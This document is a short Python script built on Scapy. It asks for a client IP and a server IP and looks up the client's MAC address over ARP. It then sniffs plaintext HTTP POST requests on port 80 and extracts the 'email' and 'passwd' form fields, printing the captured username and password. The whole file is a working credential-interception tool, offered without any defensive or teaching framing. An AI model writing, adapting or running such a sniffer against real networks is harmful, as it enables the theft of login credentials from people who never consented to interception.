from scapy.all import *

from pip._vendor.distlib.compat import raw_input



login=""

password=""

login_field="email="

password_field="passwd="



def get_mac(IP, interface="eth0"):

    conf.verb = 0

    ans, unans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=IP), timeout=2, iface=interface, inter=0.1)

    for snd, rcv in ans:

        return rcv.sprintf(r"%Ether.src%")



try:

    interface = raw_input("Enter Desired Interface [eth0]: ")

    if interface == "":

        interface = "eth0"

    target1_ip = raw_input("[*] Enter Client IP: ")

    target2_ip = raw_input("[*] Enter Server IP: ")

except KeyboardInterrupt:

    print("\n[*] User Requested Shutdown")

    print("[*] Exiting...")

    sys.exit(1)



def get_index(buff, subbuff):

    return buff.index(subbuff)



def get_http_credentials(pkt):

    global login

    global password

    global password_field

    global login_field

    full_str_credentials = ""

    try:

        pkt.getlayer(Raw).load



    except:

        return



    payload = str(pkt.getlayer(Raw).load)



    if "POST" in payload and "Upgrade-Insecure-Requests" in payload:

        try:

            for i in range(get_index(payload, login_field), len(payload) - 1 ):

                full_str_credentials = full_str_credentials + payload[i]

            

        except:

            print("credentials not found in POST request")

            return



        for j in range(get_index(full_str_credentials, login_field) + len(login_field), full_str_credentials.index("&")):

            login = login + full_str_credentials[j]



        for k in range(get_index(full_str_credentials, password_field)+ len(password_field), len(full_str_credentials)):

            password = password + full_str_credentials[k]

        

        print("user login: " + login + " | user password: " + password)

        sys.exit(1)

    else:

        return



client_mac = get_mac(target1_ip)

sniff(iface=interface, prn=get_http_credentials, filter='dst port 80 and ether src {} and host {}'.format(client_mac, target2_ip), store=0,

count=0)